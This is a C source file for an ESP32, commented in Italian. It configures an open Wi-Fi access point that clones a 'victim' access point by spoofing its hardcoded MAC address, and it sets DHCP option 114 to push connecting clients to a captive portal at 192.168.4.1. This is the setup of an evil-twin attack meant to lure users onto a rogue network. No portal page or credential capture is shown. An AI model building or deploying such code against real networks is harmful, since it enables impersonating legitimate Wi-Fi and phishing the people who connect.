#include <string.h>
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_mac.h"
#include "esp_wifi.h"
#include "esp_err.h"
#include "esp_wifi_types_generic.h"

void wifiInit(void){
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK( ret );

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    cfg.nvs_enable = false; //non voglio immagazzinare nessun dato o config nella NVM
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
}

void wifiSetupSTA(void){ //avvia wifi in modalita' station
    esp_netif_t *sta_netif = esp_netif_create_default_wifi_sta();
    assert(sta_netif);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));

    ESP_ERROR_CHECK(esp_wifi_start());
}

static const char *TAG = "wifi softAP";

static void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data){
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        ESP_LOGI(TAG, "station "MACSTR" join, AID=%d", MAC2STR(event->mac), event->aid);
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        ESP_LOGI(TAG, "station "MACSTR" leave, AID=%d, reason=%d", MAC2STR(event->mac), event->aid, event->reason);
    }
}

void wifiSetupAP(void){ //avvia wifi in modalita' access point, clonando il bersaglio
    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
    assert(ap_netif);

    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, 
        ESP_EVENT_ANY_ID, 
        &wifi_event_handler, 
        NULL, 
        NULL
    ));

    wifi_config_t wifi_config = {0};
    char* wifiname = {"RadioPhobia"};
    strlcpy((char *)wifi_config.ap.ssid, wifiname, sizeof(wifi_config.ap.ssid));
    //wifi_config.ap.ssid = "RadioPhobia";
    wifi_config.ap.ssid_len = strlen(wifiname);
    //wifi_config.ap.channel = //controllare se ha senso impostare il canale uguale a quello dell'AP vittima
    wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    wifi_config.ap.max_connection = 4;

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));

    uint8_t spoofed_mac[6]  = {0xFC, 0x40, 0x09, 0xDD, 0x0A, 0xF1};
    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, spoofed_mac)); //spoof con macaddress AP vittima

    //dhcp setup per captive portal
    const char* captiveportal_uri = "http://192.168.4.1"; //impostato con ip di default del softAP

    ESP_ERROR_CHECK(esp_netif_dhcps_option(
        ap_netif, 
        ESP_NETIF_OP_SET, 
        ESP_NETIF_CAPTIVEPORTAL_URI, 
        (void*)captiveportal_uri, 
        strlen(captiveportal_uri)
    ));

    ESP_LOGI(TAG, "Configurato DHCP Option 114 con URI: %s", captiveportal_uri);

    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "wifi_init_softap finished. SSID:'%s'", wifi_config.ap.ssid);
}
